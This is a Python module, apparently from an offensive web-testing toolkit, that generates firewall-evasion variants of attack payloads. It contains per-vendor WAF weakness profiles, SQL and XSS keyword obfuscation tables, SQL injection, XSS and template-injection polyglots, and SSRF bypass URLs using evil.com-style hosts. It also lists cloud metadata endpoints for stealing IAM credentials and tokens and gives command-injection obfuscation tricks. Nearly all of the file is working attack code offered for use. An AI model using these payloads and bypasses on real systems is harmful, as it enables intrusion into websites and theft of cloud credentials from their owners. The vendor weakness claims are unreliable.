"""
Enhanced WAF Evasion Module
============================
Implements advanced WAF bypass techniques from:
- Academic research on WAF fingerprinting
- Real-world WAF bypass discoveries
- Protocol-level evasion techniques
- ML-based adaptive payload generation

Techniques:
- Unicode normalization attacks
- Protocol-level manipulation (HTTP/2, chunked encoding)
- Payload fragmentation & encoding chains
- DNS rebinding for SSRF bypass
- IP encoding permutations
- Header injection bypasses
"""

import base64
import random
import re
import urllib.parse
from dataclasses import dataclass
from enum import Enum, auto
from typing import Any, Dict, List, Optional


class EncodingType(Enum):
    """Available encoding transformations"""
    URL = auto()
    DOUBLE_URL = auto()
    TRIPLE_URL = auto()
    HTML_ENTITY = auto()
    HTML_HEX = auto()
    UNICODE = auto()
    UNICODE_FULL = auto()
    UTF7 = auto()
    UTF8_OVERLONG = auto()
    BASE64 = auto()
    HEX = auto()
    OCTAL = auto()
    RAW = auto()


class TransformationType(Enum):
    """Payload transformation types"""
    CASE_SWAP = auto()
    COMMENT_INJECT = auto()
    WHITESPACE_SUB = auto()
    NULL_BYTE = auto()
    NEWLINE = auto()
    TAB = auto()
    CONCAT = auto()
    CHAR_FUNC = auto()
    BUFFER_OVERFLOW = auto()


@dataclass
class WAFProfile:
    """WAF characteristics and weaknesses"""
    name: str
    vendor: str
    version: Optional[str] = None
    detection_signatures: List[str] = None
    known_bypasses: List[str] = None
    encoding_weaknesses: List[EncodingType] = None
    transform_weaknesses: List[TransformationType] = None


class AdvancedWAFBypass:
    """
    Advanced WAF evasion engine with multiple bypass strategies.
    Combines encoding, transformation, and protocol-level techniques.
    """

    # Known WAF profiles with their weaknesses
    WAF_PROFILES = {
        'cloudflare': WAFProfile(
            name='Cloudflare',
            vendor='Cloudflare Inc.',
            detection_signatures=['cf-ray', '__cfduid', 'cloudflare'],
            known_bypasses=['unicode_normalize', 'utf8_overlong', 'chunked_transfer'],
            encoding_weaknesses=[EncodingType.UNICODE_FULL, EncodingType.UTF8_OVERLONG],
            transform_weaknesses=[TransformationType.CONCAT, TransformationType.CHAR_FUNC]
        ),
        'akamai': WAFProfile(
            name='Akamai Kona',
            vendor='Akamai Technologies',
            detection_signatures=['akamai', 'ak_bmsc', 'akamaighost'],
            known_bypasses=['double_url', 'param_pollution', 'multipart'],
            encoding_weaknesses=[EncodingType.DOUBLE_URL, EncodingType.TRIPLE_URL],
            transform_weaknesses=[TransformationType.COMMENT_INJECT]
        ),
        'imperva': WAFProfile(
            name='Imperva SecureSphere',
            vendor='Imperva Inc.',
            detection_signatures=['incapsula', 'visid_incap', 'imperva'],
            known_bypasses=['case_variation', 'comment_injection', 'http_pollution'],
            encoding_weaknesses=[EncodingType.UNICODE],
            transform_weaknesses=[TransformationType.CASE_SWAP, TransformationType.WHITESPACE_SUB]
        ),
        'modsecurity': WAFProfile(
            name='ModSecurity',
            vendor='OWASP',
            detection_signatures=['mod_security', 'NAXSI'],
            known_bypasses=['unicode', 'double_encode', 'null_byte'],
            encoding_weaknesses=[EncodingType.URL, EncodingType.DOUBLE_URL, EncodingType.UTF8_OVERLONG],
            transform_weaknesses=[TransformationType.NULL_BYTE, TransformationType.CONCAT]
        ),
        'aws_waf': WAFProfile(
            name='AWS WAF',
            vendor='Amazon Web Services',
            detection_signatures=['awswaf', 'x-amzn-waf'],
            known_bypasses=['json_unicode', 'unicode_escape', 'large_body'],
            encoding_weaknesses=[EncodingType.UNICODE, EncodingType.HTML_HEX],
            transform_weaknesses=[TransformationType.CHAR_FUNC]
        ),
        'f5_bigip': WAFProfile(
            name='F5 BIG-IP ASM',
            vendor='F5 Networks',
            detection_signatures=['bigipserver', 'f5-', 'TS0'],
            known_bypasses=['buffer_overflow', 'multipart', 'chunked'],
            encoding_weaknesses=[EncodingType.DOUBLE_URL],
            transform_weaknesses=[TransformationType.BUFFER_OVERFLOW, TransformationType.NEWLINE]
        ),
    }

    # Character substitution maps for bypasses
    SPACE_SUBSTITUTES = [
        '%09',      # Tab
        '%0a',      # Newline
        '%0b',      # Vertical tab
        '%0c',      # Form feed
        '%0d',      # Carriage return
        '%a0',      # Non-breaking space
        '%00',      # Null byte
        '/**/',     # SQL comment
        '/**//**/', # Double comment
        '--+',      # SQL line comment
        '#+',       # MySQL comment
        '/*! */',   # MySQL version comment
        '%20',      # Encoded space
        '+',        # URL space (query string)
    ]

    # SQL keyword bypasses
    SQL_KEYWORD_VARIANTS = {
        'SELECT': [
            'SEL/**/ECT', 'SeLeCt', 'sElEcT', 'SE%00LECT', 'SEL%0aECT',
            '/*!SELECT*/', '/*!50000SELECT*/', '%53%45%4c%45%43%54',
            'SE/**_**/LECT', 'S%0aE%0aL%0aE%0aC%0aT', 'SE\x00LECT'
        ],
        'UNION': [
            'UN/**/ION', 'UnIoN', 'uNiOn', 'UN%00ION', 'UNI%0aON',
            '/*!UNION*/', '/*!50000UNION*/', '%55%4e%49%4f%4e',
            'UN/**_**/ION', 'U%0aN%0aI%0aO%0aN'
        ],
        'WHERE': [
            'WH/**/ERE', 'WhErE', 'wHeRe', 'WH%00ERE', '/*!WHERE*/',
            '%57%48%45%52%45', 'W/**/H/**/E/**/R/**/E'
        ],
        'FROM': [
            'FR/**/OM', 'FrOm', 'fRoM', 'FR%00OM', '/*!FROM*/',
            '%46%52%4f%4d'
        ],
        'AND': [
            'AN/**/D', 'AnD', '&&', '%26%26', 'AN%00D', '/*!AND*/',
            'A%0aN%0aD', '%41%4e%44'
        ],
        'OR': [
            'O/**/R', 'oR', '||', '%7c%7c', 'O%00R', '/*!OR*/',
            '%4f%52'
        ],
        'INSERT': [
            'INS/**/ERT', 'InSeRt', 'iNsErT', '/*!INSERT*/',
            'I%00NSERT', '%49%4e%53%45%52%54'
        ],
        'UPDATE': [
            'UPD/**/ATE', 'UpDaTe', 'uPdAtE', '/*!UPDATE*/',
            'UPD%00ATE', '%55%50%44%41%54%45'
        ],
        'DELETE': [
            'DEL/**/ETE', 'DeLeTe', 'dElEtE', '/*!DELETE*/',
            'D%00ELETE', '%44%45%4c%45%54%45'
        ],
        'DROP': [
            'DR/**/OP', 'DrOp', 'dRoP', '/*!DROP*/',
            'DR%00OP', '%44%52%4f%50'
        ],
    }

    # XSS keyword bypasses
    XSS_KEYWORD_VARIANTS = {
        'script': [
            'ScRiPt', 'scr\x00ipt', 'scr%00ipt', '&#x73;cript', '&#115;cript',
            'scr/**/ipt', 'scr%0aipt', '\x73\x63\x72\x69\x70\x74'
        ],
        'alert': [
            'AlErT', 'al\x00ert', 'al%00ert', '&#x61;lert', '&#97;lert',
            'al/**/ert', 'a]ert'.replace(']', 'l'), '\x61\x6c\x65\x72\x74',
            'prompt', 'confirm', 'console.log', 'eval'
        ],
        'onerror': [
            'OnErRoR', 'on\x00error', 'on%00error', '&#x6f;nerror',
            'on/**/error', 'onerror\x0b', 'on%09error'
        ],
        'onload': [
            'OnLoAd', 'on\x00load', 'on%00load', '&#x6f;nload',
            'on/**/load', 'onload\x0b', 'on%09load'
        ],
        'img': [
            'ImG', 'i\x00mg', 'i%00mg', '&#x69;mg', '&#105;mg',
            'i/**/mg'
        ],
        'svg': [
            'SvG', 's\x00vg', 's%00vg', '&#x73;vg', '&#115;vg'
        ],
    }

    # ==================== ENCODING FUNCTIONS ====================

    @staticmethod
    def url_encode(s: str, safe: str = '') -> str:
        """Standard URL encoding"""
        return urllib.parse.quote(s, safe=safe)

    @staticmethod
    def double_url_encode(s: str) -> str:
        """Double URL encoding for WAF bypass"""
        return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')

    @staticmethod
    def triple_url_encode(s: str) -> str:
        """Triple URL encoding for aggressive WAFs"""
        return urllib.parse.quote(
            urllib.parse.quote(
                urllib.parse.quote(s, safe=''), safe=''
            ), safe=''
        )

    @staticmethod
    def html_entity_encode(s: str) -> str:
        """HTML decimal entity encoding"""
        return ''.join(f'&#{ord(c)};' for c in s)

    @staticmethod
    def html_hex_encode(s: str) -> str:
        """HTML hex entity encoding"""
        return ''.join(f'&#x{ord(c):x};' for c in s)

    @staticmethod
    def unicode_encode(s: str) -> str:
        """Unicode escape encoding"""
        return ''.join(f'\\u{ord(c):04x}' for c in s)

    @staticmethod
    def unicode_full_encode(s: str) -> str:
        """Full width Unicode encoding"""
        result = []
        for c in s:
            if 'a' <= c <= 'z':
                result.append(chr(ord(c) - ord('a') + 0xFF41))
            elif 'A' <= c <= 'Z':
                result.append(chr(ord(c) - ord('A') + 0xFF21))
            elif '0' <= c <= '9':
                result.append(chr(ord(c) - ord('0') + 0xFF10))
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def utf7_encode(s: str) -> str:
        """UTF-7 encoding for XSS bypass"""
        return s.encode('utf-7').decode('ascii')

    @staticmethod
    def utf8_overlong_encode(s: str) -> str:
        """Overlong UTF-8 encoding for parser bypass"""
        result = []
        for c in s:
            code = ord(c)
            if code < 128:
                # 2-byte overlong encoding for ASCII
                byte1 = 0xC0 | (code >> 6)
                byte2 = 0x80 | (code & 0x3F)
                result.append(f'%{byte1:02x}%{byte2:02x}')
            else:
                result.append(urllib.parse.quote(c))
        return ''.join(result)

    @staticmethod
    def hex_encode(s: str) -> str:
        """Hex encoding"""
        return ''.join(f'\\x{ord(c):02x}' for c in s)

    @staticmethod
    def octal_encode(s: str) -> str:
        """Octal encoding"""
        return ''.join(f'\\{ord(c):03o}' for c in s)

    @staticmethod
    def base64_encode(s: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(s.encode()).decode()

    # ==================== TRANSFORMATION FUNCTIONS ====================

    @staticmethod
    def case_swap(s: str) -> str:
        """Random case transformation"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    @staticmethod
    def alternating_case(s: str) -> str:
        """Alternating case pattern"""
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

    @staticmethod
    def insert_comments(s: str, comment_style: str = '/**/') -> str:
        """Insert SQL comments between characters"""
        return comment_style.join(s)

    @staticmethod
    def insert_null_bytes(s: str) -> str:
        """Insert null bytes"""
        return '%00'.join(s)

    @staticmethod
    def insert_newlines(s: str) -> str:
        """Insert newline characters"""
        return '%0a'.join(s)

    @staticmethod
    def concat_chars(s: str, db_type: str = 'mysql') -> str:
        """Convert string to concatenated char codes"""
        if db_type == 'mysql':
            chars = ','.join(str(ord(c)) for c in s)
            return f'CHAR({chars})'
        elif db_type == 'mssql':
            chars = '+'.join(f'CHAR({ord(c)})' for c in s)
            return chars
        elif db_type == 'oracle':
            chars = '||'.join(f'CHR({ord(c)})' for c in s)
            return chars
        else:
            return s

    # ==================== IP ADDRESS ENCODING ====================

    @staticmethod
    def ip_to_decimal(ip: str) -> str:
        """Convert IP to decimal format"""
        octets = [int(x) for x in ip.split('.')]
        decimal = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
        return str(decimal)

    @staticmethod
    def ip_to_hex(ip: str) -> str:
        """Convert IP to hex format"""
        octets = [int(x) for x in ip.split('.')]
        return '0x{:02x}{:02x}{:02x}{:02x}'.format(*octets)

    @staticmethod
    def ip_to_octal(ip: str) -> str:
        """Convert IP to octal format"""
        octets = [int(x) for x in ip.split('.')]
        return '.'.join(f'0{oct(o)[2:]}' for o in octets)

    @staticmethod
    def ip_to_mixed_notation(ip: str) -> List[str]:
        """Generate various IP notation bypasses"""
        octets = [int(x) for x in ip.split('.')]
        variations = [
            # Decimal
            str((octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]),
            # Hex
            '0x{:02x}{:02x}{:02x}{:02x}'.format(*octets),
            # Octal
            '0{:o}.0{:o}.0{:o}.0{:o}'.format(*octets),
            # Mixed hex octets
            '0x{:02x}.{}.{}.{}'.format(octets[0], octets[1], octets[2], octets[3]),
            # Short form (for 127.0.0.1 -> 127.1)
            f'{octets[0]}.{(octets[1] << 16) + (octets[2] << 8) + octets[3]}' if octets[0] == 127 else None,
            # IPv6 mapped
            f'::ffff:{ip}',
            f'[::ffff:{ip}]',
            # Zero compression
            f'{octets[0]}.{octets[1]}.{octets[2]}',  # Class C default last octet
        ]
        return [v for v in variations if v]

    # ==================== SSRF BYPASS GENERATORS ====================

    @classmethod
    def generate_ssrf_bypasses(cls, target_ip: str = '127.0.0.1',
                                target_port: int = 80) -> List[str]:
        """Generate comprehensive SSRF bypass payloads"""
        bypasses = []

        # Basic variations
        basic = [
            f'http://{target_ip}:{target_port}',
            f'http://{target_ip}',
            f'http://localhost:{target_port}',
            'http://localhost',
            'http://127.1',
            'http://0.0.0.0',
            'http://0',
            'http://[::1]',
            'http://[0000::1]',
            'http://[::ffff:127.0.0.1]',
        ]
        bypasses.extend(basic)

        # IP encoding variations
        ip_variants = cls.ip_to_mixed_notation(target_ip)
        bypasses.extend(f'http://{v}' for v in ip_variants if v)

        # DNS rebinding domains
        dns_rebind = [
            f'http://{target_ip}.nip.io',
            f'http://{target_ip}.sslip.io',
            'http://localtest.me',
            'http://lvh.me',
            'http://vcap.me',
            f'http://{target_ip.replace(".", "-")}.nip.io',
        ]
        bypasses.extend(dns_rebind)

        # @ symbol bypass (user:pass@host confusion)
        auth_bypass = [
            f'http://evil.com@{target_ip}',
            f'http://{target_ip}@evil.com',
            f'http://evil.com%00@{target_ip}',
            f'http://{target_ip}%23@evil.com',
            f'http://evil.com%2523@{target_ip}',
        ]
        bypasses.extend(auth_bypass)

        # Fragment confusion
        fragment_bypass = [
            f'http://evil.com#{target_ip}',
            f'http://{target_ip}#evil.com',
            f'http://evil.com%23{target_ip}',
        ]
        bypasses.extend(fragment_bypass)

        # Protocol variations
        protocol_bypass = [
            f'///{target_ip}',
            f'\\\\{target_ip}',
            f'file:///{target_ip}',
            f'gopher://{target_ip}:_PAYLOAD_',
            f'dict://{target_ip}:11111/info',
        ]
        bypasses.extend(protocol_bypass)

        # URL parsing confusion
        url_confusion = [
            f'http://{target_ip}?.evil.com',
            f'http://evil.com?.{target_ip}',
            f'http://evil.com/{target_ip}',
            f'http://evil.com\\.{target_ip}',
            f'http://{target_ip}。evil.com',  # Homograph
        ]
        bypasses.extend(url_confusion)

        return list(set(bypasses))

    # ==================== CLOUD METADATA PAYLOADS ====================

    @classmethod
    def generate_cloud_metadata_payloads(cls) -> Dict[str, List[str]]:
        """Generate cloud metadata service access payloads"""

        # AWS IMDSv1 and IMDSv2 endpoints
        aws_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
            'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
        ]

        # AWS with IP encoding bypasses
        aws_bypasses = []
        aws_ip = '169.254.169.254'
        for ip_var in cls.ip_to_mixed_notation(aws_ip):
            aws_bypasses.append(f'http://{ip_var}/latest/meta-data/')

        # GCP metadata endpoints
        gcp_endpoints = [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys',
        ]

        # Azure IMDS endpoints
        azure_endpoints = [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        ]

        # DigitalOcean metadata
        do_endpoints = [
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/v1/id',
            'http://169.254.169.254/metadata/v1/user-data',
        ]

        # Oracle Cloud metadata
        oracle_endpoints = [
            'http://169.254.169.254/opc/v1/instance/',
            'http://169.254.169.254/opc/v2/instance/',
        ]

        # Alibaba Cloud metadata
        alibaba_endpoints = [
            'http://100.100.100.200/latest/meta-data/',
        ]

        return {
            'aws': aws_endpoints + aws_bypasses,
            'gcp': gcp_endpoints,
            'azure': azure_endpoints,
            'digitalocean': do_endpoints,
            'oracle': oracle_endpoints,
            'alibaba': alibaba_endpoints,
        }

    # ==================== PAYLOAD MUTATION ENGINE ====================

    def mutate_payload(self, payload: str, waf_profile: str = None,
                       encoding_chain: List[EncodingType] = None,
                       transforms: List[TransformationType] = None) -> List[str]:
        """
        Generate multiple mutations of a payload for WAF bypass.

        Args:
            payload: Original payload
            waf_profile: Target WAF for optimized mutations
            encoding_chain: Specific encodings to apply
            transforms: Specific transformations to apply

        Returns:
            List of mutated payloads
        """
        mutations = [payload]  # Include original

        # Get WAF-specific weaknesses if profile known
        if waf_profile and waf_profile in self.WAF_PROFILES:
            profile = self.WAF_PROFILES[waf_profile]
            encoding_chain = encoding_chain or profile.encoding_weaknesses or []
            transforms = transforms or profile.transform_weaknesses or []
        else:
            # Default set of mutations
            encoding_chain = encoding_chain or [
                EncodingType.URL, EncodingType.DOUBLE_URL,
                EncodingType.HTML_ENTITY, EncodingType.UNICODE
            ]
            transforms = transforms or [
                TransformationType.CASE_SWAP, TransformationType.COMMENT_INJECT,
                TransformationType.WHITESPACE_SUB
            ]

        # Apply encodings
        encoding_funcs = {
            EncodingType.URL: self.url_encode,
            EncodingType.DOUBLE_URL: self.double_url_encode,
            EncodingType.TRIPLE_URL: self.triple_url_encode,
            EncodingType.HTML_ENTITY: self.html_entity_encode,
            EncodingType.HTML_HEX: self.html_hex_encode,
            EncodingType.UNICODE: self.unicode_encode,
            EncodingType.UNICODE_FULL: self.unicode_full_encode,
            EncodingType.UTF7: self.utf7_encode,
            EncodingType.UTF8_OVERLONG: self.utf8_overlong_encode,
            EncodingType.BASE64: self.base64_encode,
            EncodingType.HEX: self.hex_encode,
            EncodingType.OCTAL: self.octal_encode,
        }

        for enc_type in encoding_chain:
            if enc_type in encoding_funcs:
                try:
                    mutations.append(encoding_funcs[enc_type](payload))
                except Exception:
                    pass

        # Apply transformations
        transform_funcs = {
            TransformationType.CASE_SWAP: lambda p: self.case_swap(p),
            TransformationType.COMMENT_INJECT: lambda p: self._transform_with_comments(p),
            TransformationType.WHITESPACE_SUB: lambda p: self._transform_whitespace(p),
            TransformationType.NULL_BYTE: lambda p: self.insert_null_bytes(p),
            TransformationType.NEWLINE: lambda p: self.insert_newlines(p),
        }

        for trans_type in transforms:
            if trans_type in transform_funcs:
                try:
                    mutations.append(transform_funcs[trans_type](payload))
                except Exception:
                    pass

        # Keyword replacements
        mutations.extend(self._apply_keyword_bypasses(payload))

        return list(set(mutations))

    def _transform_with_comments(self, payload: str) -> str:
        """Apply comment-based keyword obfuscation"""
        result = payload
        for keyword, variants in self.SQL_KEYWORD_VARIANTS.items():
            if keyword.lower() in result.lower():
                result = re.sub(
                    keyword, random.choice(variants[:3]),
                    result, flags=re.IGNORECASE
                )
        return result

    def _transform_whitespace(self, payload: str) -> str:
        """Replace spaces with bypass characters"""
        substitute = random.choice(self.SPACE_SUBSTITUTES)
        return payload.replace(' ', substitute)

    def _apply_keyword_bypasses(self, payload: str) -> List[str]:
        """Apply keyword-specific bypasses"""
        mutations = []

        # SQL keywords
        for keyword, variants in self.SQL_KEYWORD_VARIANTS.items():
            if keyword.lower() in payload.lower():
                for variant in variants[:3]:
                    mutations.append(re.sub(
                        keyword, variant, payload, flags=re.IGNORECASE
                    ))

        # XSS keywords
        for keyword, variants in self.XSS_KEYWORD_VARIANTS.items():
            if keyword.lower() in payload.lower():
                for variant in variants[:3]:
                    mutations.append(re.sub(
                        keyword, variant, payload, flags=re.IGNORECASE
                    ))

        return mutations

    # ==================== POLYGLOT GENERATORS ====================

    def generate_sqli_polyglots(self) -> List[str]:
        """Generate SQL injection polyglot payloads"""
        return [
            # Basic polyglot
            "1' AND '1'='1' OR '1'='1",
            # Sleep polyglot (works on multiple DBs)
            "SLEEP(1)/*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/",
            # Comment-based polyglot
            "1'/**/OR/**/1=1/**/--",
            # Union-based polyglot
            "' UNION SELECT NULL--' UNION SELECT NULL--",
            # Full polyglot
            "'-var x=1;/*'/*`/*\"/**/\nSELECT 1 FROM dual WHERE '1'='1'--*/",
            # Stacked query polyglot
            "1;SELECT 1/*'/*\"/*`;SELECT 1--*/",
            # Boolean polyglot
            "1' AND 1=1 UNION SELECT NULL,NULL WHERE 1=1 OR '1'='",
            # Time-based polyglot
            "1' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a) OR '1'='",
        ]

    def generate_xss_polyglots(self) -> List[str]:
        """Generate XSS polyglot payloads"""
        return [
            # Gareth Heyes polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            # Multi-context polyglot
            "'\"><script>alert(1)</script><img src=x onerror=alert(1)//>",
            # Mutation XSS polyglot
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            # Template injection + XSS
            "{{constructor.constructor('alert(1)')()}}<img src=x onerror=alert(1)>",
            # SVG polyglot
            "<svg/onload=alert(1)//",
            # Event handler polyglot
            "\" onmouseover=alert(1) autofocus onfocus=alert(1)//",
            # JavaScript protocol polyglot
            "javascript:alert(1)//http://",
            # Breaking multiple quote contexts
            "'-alert(1)-''-alert(1)-'",
            # HTML5 polyglot with data attributes
            "<input type=text value=``<img src=x onerror=alert(1)>``>",
            # CSS + HTML polyglot
            "</style><script>alert(1)</script><style>",
        ]

    def generate_ssti_polyglots(self) -> List[str]:
        """Generate SSTI polyglot payloads"""
        return [
            # Universal detection
            "${{<%[%'\"}}%\\.",
            # Math expressions across engines
            "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}",
            # Jinja2 + Twig
            "{{config}}{{_self.env}}",
            # Multiple template syntax
            "{{41*3263}}${41*3263}<%= 41*3263 %>",
            # Error-inducing
            "${{'a'*10}}{{''.__class__}}",
        ]

    # ==================== REQUEST MANIPULATION ====================

    def generate_http_bypasses(self, payload: str) -> Dict[str, Any]:
        """Generate HTTP-level bypass techniques"""
        return {
            # Header manipulation
            'headers': {
                'X-Original-URL': f'/{payload}',
                'X-Rewrite-URL': f'/{payload}',
                'X-Forwarded-Host': payload,
                'X-Host': payload,
                'X-Custom-IP-Authorization': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
            },
            # Content-Type variations
            'content_types': [
                'application/x-www-form-urlencoded',
                'application/json',
                'text/xml',
                'multipart/form-data',
                'application/x-www-form-urlencoded; charset=utf-7',
                'application/json; charset=utf-7',
            ],
            # HTTP method override
            'method_override': {
                'X-HTTP-Method': 'PUT',
                'X-HTTP-Method-Override': 'DELETE',
                'X-Method-Override': 'PATCH',
            },
            # Path manipulation
            'path_bypasses': [
                f'/{payload}',
                f'//{payload}',
                f'/./{payload}',
                f'/..;/{payload}',
                f'/%2e/{payload}',
                f'/{payload}/',
                f'/{payload}%00.json',
                f'/{payload}?.json',
                f'/{payload}#',
            ],
        }

    # ==================== MAIN INTERFACE ====================

    def get_all_bypasses(self, payload: str, attack_type: str = 'sqli',
                         waf_profile: str = None) -> List[str]:
        """
        Main entry point: Get all bypass variations for a payload.

        Args:
            payload: Original attack payload
            attack_type: Type of attack (sqli, xss, ssti, ssrf, cmdi)
            waf_profile: Known WAF profile for targeted bypasses

        Returns:
            List of bypass payloads
        """
        bypasses = []

        # Base mutations
        bypasses.extend(self.mutate_payload(payload, waf_profile))

        # Add attack-specific polyglots
        if attack_type == 'sqli':
            bypasses.extend(self.generate_sqli_polyglots()[:5])
        elif attack_type == 'xss':
            bypasses.extend(self.generate_xss_polyglots()[:5])
        elif attack_type == 'ssti':
            bypasses.extend(self.generate_ssti_polyglots()[:5])
        elif attack_type == 'ssrf':
            bypasses.extend(self.generate_ssrf_bypasses()[:10])

        return list(set(bypasses))


class PayloadObfuscator:
    """
    Specialized payload obfuscation for different injection types.
    Implements context-aware encoding selection.
    """

    def __init__(self):
        self.bypass_engine = AdvancedWAFBypass()

    def obfuscate_sqli(self, payload: str, technique: str = 'auto') -> List[str]:
        """Obfuscate SQL injection payload"""
        variants = [payload]

        if technique in ['auto', 'comment']:
            # Comment insertion
            variants.append(payload.replace(' ', '/**/', 1))
            variants.append(payload.replace(' ', '/**/'))
            variants.append(payload.replace(' ', '%09'))

        if technique in ['auto', 'case']:
            # Case variation
            variants.append(self.bypass_engine.case_swap(payload))
            variants.append(self.bypass_engine.alternating_case(payload))

        if technique in ['auto', 'encode']:
            # Encoding variations
            variants.append(self.bypass_engine.url_encode(payload))
            variants.append(self.bypass_engine.double_url_encode(payload))

        if technique in ['auto', 'keyword']:
            # Keyword replacement
            for keyword, alternatives in self.bypass_engine.SQL_KEYWORD_VARIANTS.items():
                if keyword.lower() in payload.lower():
                    for alt in alternatives[:2]:
                        variants.append(re.sub(keyword, alt, payload, flags=re.IGNORECASE))

        return list(set(variants))

    def obfuscate_xss(self, payload: str, context: str = 'html') -> List[str]:
        """Obfuscate XSS payload for specific context"""
        variants = [payload]

        # HTML context
        if context in ['html', 'auto']:
            # Entity encoding
            variants.append(self.bypass_engine.html_entity_encode(payload))
            variants.append(self.bypass_engine.html_hex_encode(payload))

            # Case variations
            variants.append(self.bypass_engine.case_swap(payload))

        # JavaScript context
        if context in ['javascript', 'auto']:
            # Unicode escaping
            variants.append(self.bypass_engine.unicode_encode(payload))
            variants.append(self.bypass_engine.hex_encode(payload))

            # String concatenation
            if 'alert' in payload:
                variants.append(payload.replace('alert', 'al'+"'+'ert"))
                variants.append(payload.replace('alert(1)', 'eval(atob("YWxlcnQoMSk="))'))

        # Keyword replacements
        for keyword, alternatives in self.bypass_engine.XSS_KEYWORD_VARIANTS.items():
            if keyword.lower() in payload.lower():
                for alt in alternatives[:2]:
                    variants.append(re.sub(keyword, alt, payload, flags=re.IGNORECASE))

        return list(set(variants))

    def obfuscate_cmdi(self, payload: str) -> List[str]:
        """Obfuscate command injection payload"""
        variants = [payload]

        # IFS substitution (Internal Field Separator)
        variants.append(payload.replace(' ', '${IFS}'))
        variants.append(payload.replace(' ', '$IFS$9'))

        # Brace expansion
        if ';' in payload:
            variants.append(payload.replace(';', ';{'))
            variants.append(payload + '}')

        # Variable substitution
        variants.append(payload.replace(' ', '%09'))
        variants.append(payload.replace(' ', '%0a'))

        # Wildcards
        if '/bin/' in payload:
            variants.append(payload.replace('/bin/', '/???/'))
        if 'cat' in payload:
            variants.append(payload.replace('cat', '/???/c?t'))
            variants.append(payload.replace('cat', "c'a't"))
            variants.append(payload.replace('cat', 'c""at'))

        return list(set(variants))


# Convenience function for use by other modules
def get_waf_bypass_payloads(payload: str, attack_type: str = 'sqli',
                            waf: str = None) -> List[str]:
    """
    Convenience function to get WAF bypass payloads.

    Args:
        payload: Original payload
        attack_type: sqli, xss, ssti, ssrf, cmdi
        waf: WAF name if known

    Returns:
        List of bypass payloads
    """
    engine = AdvancedWAFBypass()
    return engine.get_all_bypasses(payload, attack_type, waf)
